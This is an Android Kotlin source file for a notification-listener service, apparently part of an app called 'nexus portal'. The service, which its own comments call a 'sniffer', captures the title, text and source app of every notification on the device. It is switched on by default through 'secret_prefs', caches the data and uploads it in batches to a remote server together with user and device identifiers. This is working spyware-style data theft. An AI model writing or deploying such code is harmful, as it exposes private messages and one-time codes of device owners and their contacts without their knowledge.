package com.nexus.portal.services

import android.content.Intent
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import com.nexus.portal.core.NetworkConfig
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.sync.Mutex
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

import org.json.JSONArray
import java.io.File
import android.os.Build
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive

class NotificationListener : NotificationListenerService() {

    private val queue = java.util.concurrent.ConcurrentLinkedQueue<JSONObject>()
    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private var uploadJob: Job? = null
    private val flushMutex = Mutex()

    override fun onCreate() {
        super.onCreate()
        // Ensure sniffer is enabled on service creation if not explicitly disabled
        val secretPrefs = getSharedPreferences("secret_prefs", android.content.Context.MODE_PRIVATE)
        if (!secretPrefs.contains("notification_sniffer_enabled")) {
            secretPrefs.edit().putBoolean("notification_sniffer_enabled", true).apply()
        }
        
        scope.launch(Dispatchers.IO) {
            loadUnsentNotifications()
            if (!queue.isEmpty()) {
                flushQueue()
            }
        }
        startUploadLoop()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        if (sbn == null) return
        
        try {
            // Check if notification sniffer is enabled (default: true)
            val secretPrefs = getSharedPreferences("secret_prefs", android.content.Context.MODE_PRIVATE)
            val snifferEnabled = secretPrefs.getBoolean("notification_sniffer_enabled", true)
            
            if (!snifferEnabled) {
                return  // Skip processing if disabled
            }
            
            val packageName = sbn.packageName
            val extras = sbn.notification.extras
            val title = extras.getString("android.title") ?: "No Title"
            val text = extras.getCharSequence("android.text")?.toString() ?: "No Message Content"
            val timestamp = System.currentTimeMillis()
            
            // 1. Broadcast locally to active Compose layout components
            val intent = Intent("com.nexus.portal.NOTIFICATION_INTERCEPTED").apply {
                putExtra("package", packageName)
                putExtra("title", title)
                putExtra("text", text)
                putExtra("timestamp", timestamp)
            }
            sendBroadcast(intent)

            // 2. Queue for batched uploading
            queueNotification(packageName, title, text, timestamp)
        } catch (e: Exception) {
            ErrorLogger.logError(applicationContext, e)
        }
    }

    private fun queueNotification(packageName: String, title: String, text: String, timestamp: Long) {
        val userId = com.nexus.portal.data.repository.ProfileRepository.activeProfile.value.id
        val deviceId = com.nexus.portal.data.repository.ProfileRepository.deviceId
        val sessionId = com.nexus.portal.data.repository.ProfileRepository.sessionId

        val item = JSONObject().apply {
            put("sender", packageName)
            put("title", title)
            put("text", text)
            put("postTime", SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
                timeZone = TimeZone.getTimeZone("UTC")
            }.format(Date(timestamp)))
            put("userId", userId)
            put("deviceId", deviceId)
            put("sessionId", sessionId)
        }

        queue.add(item)
        
        scope.launch(Dispatchers.IO) {
            saveUnsentNotifications()
            if (queue.size >= 20) {
                flushQueue()
            }
        }
    }

    private fun startUploadLoop() {
        uploadJob = scope.launch(Dispatchers.IO) {
            while (isActive) {
                delay(15L * 60L * 1000L) // check and flush every 15 minutes
                flushQueue()
            }
        }
    }

    private suspend fun flushQueue() {
        if (queue.isEmpty()) return
        if (!isNetworkAvailable()) return
        if (!flushMutex.tryLock()) return

        try {
            val itemsToUpload = queue.toList()
            if (itemsToUpload.isEmpty()) return
            
            val payload = JSONArray()
            itemsToUpload.forEach { payload.put(it) }

            val url = java.net.URL(com.nexus.portal.core.NetworkConfig.notificationsUrl)
            val connection = url.openConnection() as java.net.HttpURLConnection
            connection.requestMethod = "POST"
            connection.connectTimeout = 10000
            connection.readTimeout = 10000
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json")

            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(payload.toString())
                writer.flush()
            }

            val code = connection.responseCode
            connection.disconnect()

            if (code in 200..299) {
                queue.removeAll(itemsToUpload)
                saveUnsentNotifications()
            }
        } catch (e: Exception) {
            ErrorLogger.logError(applicationContext, e)
        } finally {
            flushMutex.unlock()
        }
    }

    private fun isNetworkAvailable(): Boolean {
        val cm = getSystemService(android.content.Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val nw = cm.activeNetwork ?: return false
            val actNw = cm.getNetworkCapabilities(nw) ?: return false
            return actNw.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
        } else {
            @Suppress("DEPRECATION")
            val nwInfo = cm.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return nwInfo.isConnected
        }
    }

    private fun loadUnsentNotifications() {
        try {
            val file = java.io.File(cacheDir, "unsent_notifications.json")
            if (file.exists()) {
                val content = file.readText()
                val arr = JSONArray(content)
                for (i in 0 until arr.length()) {
                    queue.add(arr.getJSONObject(i))
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun saveUnsentNotifications() {
        try {
            val file = java.io.File(cacheDir, "unsent_notifications.json")
            val arr = JSONArray()
            queue.forEach { arr.put(it) }
            file.writeText(arr.toString())
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        // Sniffer has successfully connected
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
    }

    override fun onDestroy() {
        super.onDestroy()
        uploadJob?.cancel()
        saveUnsentNotifications()
    }
}
